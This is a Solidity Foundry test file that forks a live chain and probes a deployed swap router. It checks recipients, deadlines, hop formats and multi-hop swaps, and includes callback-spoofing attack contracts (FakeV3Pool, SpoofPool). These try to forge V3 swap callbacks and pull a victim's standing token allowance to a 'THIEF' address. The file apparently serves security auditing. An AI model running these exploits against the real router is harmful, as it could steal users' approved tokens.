// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";

struct Hop { uint8 version; address tokenIn; address tokenOut; address pool; uint24 fee; int24 tickSpacing; address hooks; bytes hookData; address poolManager; bytes32 extra; }
interface IRouter { function swap(Hop[] calldata hops, address recipient, uint256 amountIn, uint256 minOut, uint256 deadline) external payable; function feeCollector() external view returns (address); }
interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address, uint256) external returns (bool); function allowance(address,address) external view returns (uint256); function transfer(address,uint256) external returns (bool); }

contract Caller {
    receive() external payable {}
    function go(address r, uint256 value, bytes calldata data) external returns (bool ok, bytes memory ret) { (ok, ret) = r.call{value: value}(data); }
    function approve(address t, address s, uint256 a) external { IERC20(t).approve(s, a); }
}
/// A pool that is not a pool: on swap() it asks the caller (the router) for its callback with the amount it wants.
contract FakeV3Pool {
    address public token0; address public token1; uint24 public fee; int24 public tickSpacing; address public factory;
    bool public swapCalled; bool public cbOk; bytes public cbData; bytes public cbErr;
    constructor(address a, address b, uint24 f, address fac) { (token0, token1) = a < b ? (a, b) : (b, a); fee = f; tickSpacing = 200; factory = fac; }
    function liquidity() external pure returns (uint128) { return 1e18; }
    function slot0() external pure returns (uint160, int24, uint16, uint16, uint16, uint8, bool) { return (2**96, 0, 0, 1, 1, 0, true); }
    function swap(address, bool zeroForOne, int256 amountSpecified, uint160, bytes calldata data) external returns (int256 a0, int256 a1) {
        swapCalled = true; cbData = data;
        (a0, a1) = zeroForOne ? (amountSpecified, int256(-1)) : (int256(-1), amountSpecified);
        (bool ok, bytes memory e) = msg.sender.call(abi.encodeWithSelector(0xfa461e33, a0, a1, data)); cbOk = ok; cbErr = e;   // uniswapV3SwapCallback
    }
}

contract RouterProbe is Test {
    IRouter constant R = IRouter(0x65050A9b7E5075A2bA5cED7b1b64EE66262c40Dc);
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
    address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    address constant USDG = 0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168;
    address constant V3F = 0x1f7d7550B1b028f7571E69A784071F0205FD2EfA;
    address constant BONER = 0x98096d17e191B3dA1d5f99a6D7b3584351b11E18; address constant BONER_POOL = 0xBd5cd6515ca6285941FbC177381dC8ED4844e6b8;
    address constant SGT = 0x238E40b75Ae78A1388A14e517D855893e92e58db; address constant HOOK_E5 = 0xE5e702641Ea86F4ae6cC3cDaeD2B886f976Be044;
    address constant THIEF = address(0x1111111111111111111111111111111111111111);
    Caller c; address fc;
    function setUp() public { vm.createSelectFork(vm.envOr("RH_RPC", string("https://rpc.mainnet.chain.robinhood.com")), vm.envOr("RH_BLOCK", uint256(94984000))); c = new Caller(); vm.deal(address(c), 10 ether); fc = R.feeCollector(); }
    function v3(address tin, address tout, address pool, uint24 fee, int24 ts) internal pure returns (Hop memory h) { h.version = 1; h.tokenIn = tin; h.tokenOut = tout; h.pool = pool; h.fee = fee; h.tickSpacing = ts; }
    function v4(address tin, address tout, uint24 fee, int24 ts, address hooks) internal pure returns (Hop memory h) { h.version = 2; h.tokenIn = tin; h.tokenOut = tout; h.fee = fee; h.tickSpacing = ts; h.hooks = hooks; h.poolManager = PM; }
    function one(Hop memory h) internal pure returns (Hop[] memory a) { a = new Hop[](1); a[0] = h; }
    function data(Hop[] memory hops, address rcpt, uint256 amt, uint256 minOut) internal view returns (bytes memory) { return abi.encodeWithSelector(IRouter.swap.selector, hops, rcpt, amt, minOut, block.timestamp + 600); }
    function snap(string memory tag, address token) internal {
        emit log_named_string("--", tag);
        emit log_named_uint("caller ETH", address(c).balance); emit log_named_uint("caller tok", IERC20(token).balanceOf(address(c))); emit log_named_uint("caller WETH", IERC20(WETH).balanceOf(address(c)));
        emit log_named_uint("thief ETH", THIEF.balance); emit log_named_uint("thief tok", IERC20(token).balanceOf(THIEF)); emit log_named_uint("thief WETH", IERC20(WETH).balanceOf(THIEF));
        emit log_named_uint("router ETH", address(R).balance); emit log_named_uint("router tok", IERC20(token).balanceOf(address(R))); emit log_named_uint("router WETH", IERC20(WETH).balanceOf(address(R)));
        emit log_named_uint("feeCollector ETH", fc.balance); emit log_named_uint("feeCollector WETH", IERC20(WETH).balanceOf(fc));
    }
    // P1 buy v3 WETH->BONER, recipient 0, value == amountIn
    function test_P1_buy_v3_recipient_zero() public { snap("before", BONER); (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1)); assertTrue(ok, string(e)); snap("after", BONER); }
    // P2 buy with recipient THIEF
    function test_P2_buy_v3_recipient_thief() public { (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), THIEF, 0.01 ether, 1)); emit log_named_uint("ok", ok ? 1 : 0); emit log_bytes(e); snap("after", BONER); }
    // P3 value above amountIn / below
    function test_P3_value_mismatch() public {
        (bool ok, bytes memory e) = c.go(address(R), 0.02 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1)); emit log_named_uint("value>amount ok", ok ? 1 : 0); emit log_bytes(e); snap("after >", BONER);
        (ok, e) = c.go(address(R), 0.005 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1)); emit log_named_uint("value<amount ok", ok ? 1 : 0); emit log_bytes(e);
        (ok, e) = c.go(address(R), 0, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1)); emit log_named_uint("value 0, caller holds WETH? ok", ok ? 1 : 0); emit log_bytes(e);
    }
    // P4 round trip: buy then sell back to WETH with recipient 0 / THIEF
    function test_P4_sell_v3() public {
        c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1));
        uint256 bal = IERC20(BONER).balanceOf(address(c)); c.approve(BONER, address(R), bal / 2);
        snap("before sell", BONER);
        (bool ok, bytes memory e) = c.go(address(R), 0, data(one(v3(BONER, WETH, BONER_POOL, 10000, 200)), address(0), bal / 2, 1)); assertTrue(ok, string(e));
        snap("after sell rcpt 0", BONER); emit log_named_uint("allowance left", IERC20(BONER).allowance(address(c), address(R)));
        c.approve(BONER, address(R), bal / 4);
        (ok, e) = c.go(address(R), 0, data(one(v3(BONER, WETH, BONER_POOL, 10000, 200)), THIEF, bal / 4, 1)); emit log_named_uint("sell rcpt thief ok", ok ? 1 : 0); emit log_bytes(e);
        snap("after sell rcpt thief", BONER);
        (ok, e) = c.go(address(R), 0, data(one(v3(BONER, WETH, BONER_POOL, 10000, 200)), address(0), bal / 4, 1)); emit log_named_uint("sell without allowance ok", ok ? 1 : 0); emit log_bytes(e);
    }
    // P5 v4 native buy and sell (SGT, hook e5e7)
    function test_P5_v4_native_round_trip() public {
        snap("before", SGT);
        (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(one(v4(address(0), SGT, 0, 200, HOOK_E5)), address(0), 0.01 ether, 1)); assertTrue(ok, string(e));
        snap("after buy", SGT);
        uint256 bal = IERC20(SGT).balanceOf(address(c)); c.approve(SGT, address(R), bal);
        (ok, e) = c.go(address(R), 0, data(one(v4(SGT, address(0), 0, 200, HOOK_E5)), address(0), bal, 1)); assertTrue(ok, string(e));
        snap("after sell", SGT);
    }
    // P6 fake v3 pool: does the router call an arbitrary pool and honour its callback?
    function test_P6_fake_v3_pool() public {
        FakeV3Pool fp = new FakeV3Pool(WETH, BONER, 10000, V3F);
        (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, address(fp), 10000, 200)), address(0), 0.01 ether, 1));
        emit log_named_uint("router call ok", ok ? 1 : 0); emit log_bytes(e);
        emit log_named_uint("fake swap called", fp.swapCalled() ? 1 : 0); emit log_named_uint("callback ok", fp.cbOk() ? 1 : 0); emit log_bytes(fp.cbErr()); emit log_bytes(fp.cbData());
        emit log_named_uint("fake pool WETH", IERC20(WETH).balanceOf(address(fp))); emit log_named_uint("fake pool ETH", address(fp).balance);
    }
    // P7 fake pool on a sale, caller approved more than the sale (a standing allowance)
    function test_P7_fake_v3_pool_sale() public {
        c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1));
        uint256 bal = IERC20(BONER).balanceOf(address(c)); c.approve(BONER, address(R), bal);
        FakeV3Pool fp = new FakeV3Pool(WETH, BONER, 10000, V3F);
        (bool ok, bytes memory e) = c.go(address(R), 0, data(one(v3(BONER, WETH, address(fp), 10000, 200)), address(0), bal / 2, 1));
        emit log_named_uint("router call ok", ok ? 1 : 0); emit log_bytes(e);
        emit log_named_uint("fake swap called", fp.swapCalled() ? 1 : 0); emit log_named_uint("callback ok", fp.cbOk() ? 1 : 0); emit log_bytes(fp.cbErr());
        emit log_named_uint("fake pool BONER", IERC20(BONER).balanceOf(address(fp)));
    }
    // P8 anyone calling the callback directly, as a pool would, against a victim with a standing allowance
    function test_P8_direct_callback() public {
        c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1));
        uint256 bal = IERC20(BONER).balanceOf(address(c)); c.approve(BONER, address(R), bal);
        FakeV3Pool fp = new FakeV3Pool(WETH, BONER, 10000, V3F);
        // capture the callback data a sale produces
        c.go(address(R), 0, data(one(v3(BONER, WETH, address(fp), 10000, 200)), address(0), 1e18, 1));
        bytes memory cb = fp.cbData(); emit log_bytes(cb);
        vm.prank(THIEF); (bool ok, bytes memory e) = address(R).call(abi.encodeWithSelector(0xfa461e33, int256(bal / 2), int256(-1), cb));
        emit log_named_uint("direct callback ok", ok ? 1 : 0); emit log_bytes(e); emit log_named_uint("thief BONER", IERC20(BONER).balanceOf(THIEF));
    }
    // P9 v4 hop with a foreign pool manager; v4 hop with hooks of an uninitialised pool; unknown versions; deadline 0 and past
    function test_P9_v4_fields_and_versions() public {
        Hop memory h = v4(address(0), SGT, 0, 200, HOOK_E5); h.poolManager = address(new Caller());
        (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(one(h), address(0), 0.01 ether, 1)); emit log_named_uint("foreign PM ok", ok ? 1 : 0); emit log_bytes(e);
        h = v4(address(0), SGT, 0, 200, address(0xBEEF));
        (ok, e) = c.go(address(R), 0.01 ether, data(one(h), address(0), 0.01 ether, 1)); emit log_named_uint("unknown hooks ok", ok ? 1 : 0); emit log_bytes(e);
        for (uint8 v = 0; v <= 5; v++) { if (v == 1 || v == 2) continue; Hop memory x = v3(WETH, BONER, BONER_POOL, 10000, 200); x.version = v;
            (ok, e) = c.go(address(R), 0.01 ether, data(one(x), address(0), 0.01 ether, 1)); emit log_named_uint(string.concat("version ", vm.toString(v), " ok"), ok ? 1 : 0); emit log_bytes(e); }
        (ok, e) = c.go(address(R), 0.01 ether, abi.encodeWithSelector(IRouter.swap.selector, one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1, 0)); emit log_named_uint("deadline 0 ok", ok ? 1 : 0); emit log_bytes(e);
        (ok, e) = c.go(address(R), 0.01 ether, abi.encodeWithSelector(IRouter.swap.selector, one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1, block.timestamp - 1)); emit log_named_uint("deadline past ok", ok ? 1 : 0); emit log_bytes(e);
        (ok, e) = c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, type(uint256).max)); emit log_named_uint("minOut max ok", ok ? 1 : 0); emit log_bytes(e);
        Hop memory y = v3(WETH, BONER, BONER_POOL, 3000, 60);
        (ok, e) = c.go(address(R), 0.01 ether, data(one(y), address(0), 0.01 ether, 1)); emit log_named_uint("v3 wrong fee/ts fields ok", ok ? 1 : 0); emit log_bytes(e);
        y = v3(BONER, WETH, BONER_POOL, 10000, 200); y.tokenIn = WETH; y.tokenOut = USDG;
        (ok, e) = c.go(address(R), 0.01 ether, data(one(y), address(0), 0.01 ether, 1)); emit log_named_uint("v3 pool with tokens it does not hold ok", ok ? 1 : 0); emit log_bytes(e);
    }
}

contract FakeFactory { address public pool; function setPool(address p) external { pool = p; } function getPool(address, address, uint24) external view returns (address) { return pool; } fallback() external { } }
/// A pool that names an attacker factory and asks the router to pay it from `payer` through the callback.
contract SpoofPool {
    address public token0; address public token1; uint24 public fee = 10000; int24 public tickSpacing = 200; address public factory;
    constructor(address a, address b, address fac) { (token0, token1) = a < b ? (a, b) : (b, a); factory = fac; }
    function setFactory(address f) external { factory = f; }
    function attack(address router, address payer, address tokenIn, address tokenOut, int256 amt) external returns (bool ok, bytes memory e) {
        // the callback data the router itself writes on a sale: abi.encode(SwapCallbackData{path, payer})
        bytes memory path = abi.encodePacked(tokenIn, uint24(10000), tokenOut);
        bytes memory d = abi.encodePacked(uint256(0x20), abi.encode(path, payer));
        (int256 a0, int256 a1) = tokenIn < tokenOut ? (amt, int256(0)) : (int256(0), amt);
        (ok, e) = router.call(abi.encodeWithSelector(0xfa461e33, a0, a1, d));
    }
}
contract RouterProbe2 is RouterProbe {
    // P10 can a contract that names its own factory pass the router callback validation and pull a victim allowance?
    function test_P10_callback_spoof() public {
        c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1));
        uint256 bal = IERC20(BONER).balanceOf(address(c)); c.approve(BONER, address(R), bal);   // victim with a standing allowance to the router
        FakeFactory ff = new FakeFactory(); SpoofPool sp = new SpoofPool(WETH, BONER, address(ff)); ff.setPool(address(sp));
        (bool ok, bytes memory e) = sp.attack(address(R), address(c), BONER, WETH, int256(bal));
        emit log_named_uint("spoof via own factory ok", ok ? 1 : 0); emit log_bytes(e); emit log_named_uint("spoof pool BONER", IERC20(BONER).balanceOf(address(sp)));
        sp.setFactory(V3F);
        (ok, e) = sp.attack(address(R), address(c), BONER, WETH, int256(bal));
        emit log_named_uint("spoof naming the real factory ok", ok ? 1 : 0); emit log_bytes(e);
        sp.setFactory(0xE0c4ceb92d08CA985bB70fe0a22fEb121A9854A8);
        (ok, e) = sp.attack(address(R), address(c), BONER, WETH, int256(bal));
        emit log_named_uint("spoof naming factory E0c4 ok", ok ? 1 : 0); emit log_bytes(e);
        sp.setFactory(0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865);
        (ok, e) = sp.attack(address(R), address(c), BONER, WETH, int256(bal));
        emit log_named_uint("spoof naming pancake factory ok", ok ? 1 : 0); emit log_bytes(e);
    }
}

contract RouterProbe3 is RouterProbe {
    function rev(Hop[] memory h) internal pure returns (Hop[] memory r) { r = new Hop[](h.length); for (uint256 i = 0; i < h.length; i++) { Hop memory x = h[h.length - 1 - i]; (x.tokenIn, x.tokenOut) = (x.tokenOut, x.tokenIn); r[i] = x; } }
    function roundTrip(string memory tag, Hop[] memory hops) internal {
        address token = hops[hops.length - 1].tokenOut;
        uint256 e0 = address(c).balance; uint256 f0 = fc.balance;
        (bool ok, bytes memory e) = c.go(address(R), 0.01 ether, data(hops, address(0), 0.01 ether, 1)); assertTrue(ok, string.concat(tag, " buy: ", string(e)));
        uint256 got = IERC20(token).balanceOf(address(c)); emit log_named_uint(string.concat(tag, " bought"), got); emit log_named_uint("  fee on buy", fc.balance - f0);
        for (uint256 i = 0; i < hops.length; i++) { emit log_named_address("  hop out", hops[i].tokenOut); emit log_named_uint("    router holds", hops[i].tokenOut == address(0) ? address(R).balance : IERC20(hops[i].tokenOut).balanceOf(address(R))); emit log_named_uint("    caller holds", hops[i].tokenOut == address(0) ? address(c).balance : IERC20(hops[i].tokenOut).balanceOf(address(c))); }
        Hop[] memory back = rev(hops); c.approve(token, address(R), got); f0 = fc.balance;
        (ok, e) = c.go(address(R), 0, data(back, address(0), got, 1)); assertTrue(ok, string.concat(tag, " sell: ", string(e)));
        emit log_named_uint("  ETH back (native)", address(c).balance - (e0 - 0.01 ether)); emit log_named_uint("  caller WETH", IERC20(WETH).balanceOf(address(c))); emit log_named_uint("  fee on sell", fc.balance - f0);
        emit log_named_uint("  router ETH", address(R).balance); emit log_named_uint("  router WETH", IERC20(WETH).balanceOf(address(R))); emit log_named_uint("  allowance left", IERC20(token).allowance(address(c), address(R)));
        for (uint256 i = 0; i < back.length; i++) if (back[i].tokenOut != address(0)) { emit log_named_address("  sell hop out", back[i].tokenOut); emit log_named_uint("    router holds", IERC20(back[i].tokenOut).balanceOf(address(R))); emit log_named_uint("    caller holds", IERC20(back[i].tokenOut).balanceOf(address(c))); }
    }
    function test_P11_three_hops_v3_v3_v4() public {   // QUBIT: WETH -v3-> USDG -v3-> 0x2e08 -v4(hook)-> QUBIT
        Hop[] memory h = new Hop[](3);
        h[0] = v3(WETH, USDG, 0x52e65B17fB6E5BA00Ed806f37Afcd2DaA50271Ca, 100, 1);
        h[1] = v3(USDG, 0x2e0847E8910a9732eB3fb1bb4b70a580ADAD4FE3, 0x34D0dC122CF9A8Eb296fC5e0D3A233625D7d19b7, 500, 10);
        h[2] = v4(0x2e0847E8910a9732eB3fb1bb4b70a580ADAD4FE3, 0xd1E92BA7c7355c2698addD894919Cba198601E18, 8388608, 8, 0x4e3468951D49f2EEa976eD0D6e75fFCb44a9a544);
        roundTrip("QUBIT", h);
    }
    function test_P12_v4_weth_currency() public {      // QUOTIENT: v4 pool keyed on WETH (not native), dynamic fee hook
        roundTrip("QUOTIENT", one(v4(WETH, 0x2531F3ca1b31086b7FC130eCDa6D3253DAF83ba3, 8388608, 200, 0x4e3468951D49f2EEa976eD0D6e75fFCb44a9a544)));
    }
    function test_P13_v3_two_hops_cl_factory() public { // PONS: WETH -v3-> USDG -CL(E0c4, keyed by tick spacing)-> PONS
        Hop[] memory h = new Hop[](2);
        h[0] = v3(WETH, USDG, 0x52e65B17fB6E5BA00Ed806f37Afcd2DaA50271Ca, 100, 1);
        h[1] = v3(USDG, 0x39dBED3a2bd333467115dE45665cC57F813C4571, 0xf2A0bE59AB76b96f957bd5E5b967F2B75e8dB269, 50, 50);
        roundTrip("PONS", h);
    }
    function test_P14_v3_single_and_native_v4() public {
        roundTrip("BONER", one(v3(WETH, BONER, BONER_POOL, 10000, 200)));
        roundTrip("PROLOGUE", one(v4(address(0), 0xb9972CA7188e511174947E3936a5315ac7073277, 2500, 25, address(0))));
    }
    // P15 a sale with allowance below the amount, and a buy whose hop chain is broken (tokenOut of hop 0 != tokenIn of hop 1)
    function test_P15_allowance_and_broken_chain() public {
        c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(0), 0.01 ether, 1));
        uint256 bal = IERC20(BONER).balanceOf(address(c)); c.approve(BONER, address(R), bal / 2);
        (bool ok, bytes memory e) = c.go(address(R), 0, data(one(v3(BONER, WETH, BONER_POOL, 10000, 200)), address(0), bal, 1)); emit log_named_uint("sale above allowance ok", ok ? 1 : 0); emit log_bytes(e);
        Hop[] memory h = new Hop[](2);
        h[0] = v3(WETH, USDG, 0x52e65B17fB6E5BA00Ed806f37Afcd2DaA50271Ca, 100, 1);
        h[1] = v3(WETH, BONER, BONER_POOL, 10000, 200);
        (ok, e) = c.go(address(R), 0.01 ether, data(h, address(0), 0.01 ether, 1)); emit log_named_uint("broken chain ok", ok ? 1 : 0); emit log_bytes(e);
        emit log_named_uint("caller USDG", IERC20(USDG).balanceOf(address(c))); emit log_named_uint("router USDG", IERC20(USDG).balanceOf(address(R)));
        // a buy that ends in a token that is not the last hop of a sale back
        (ok, e) = c.go(address(R), 0.01 ether, data(new Hop[](0), address(0), 0.01 ether, 1)); emit log_named_uint("empty hops ok", ok ? 1 : 0); emit log_bytes(e);
    }
}

contract RouterProbe4 is RouterProbe {
    function test_P16_router_factory_allowlist_and_self_recipient() public {
        address[5] memory fs = [0x1f7d7550B1b028f7571E69A784071F0205FD2EfA, 0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865, 0xE0c4ceb92d08CA985bB70fe0a22fEb121A9854A8, 0x1ac9dB4a2608ba45D6127B1737949b51Bb54B7F3, address(0xBEEF)];
        for (uint256 i = 0; i < fs.length; i++) { SpoofPool sp = new SpoofPool(WETH, BONER, fs[i]);
            (bool ok, bytes memory e) = sp.attack(address(R), address(c), BONER, WETH, 1);
            emit log_named_address("factory", fs[i]); emit log_named_uint("  ok", ok ? 1 : 0); emit log_bytes(e); }
        (bool ok2, bytes memory e2) = c.go(address(R), 0.01 ether, data(one(v3(WETH, BONER, BONER_POOL, 10000, 200)), address(c), 0.01 ether, 1));
        emit log_named_uint("recipient = caller itself ok", ok2 ? 1 : 0); emit log_bytes(e2);
    }
}
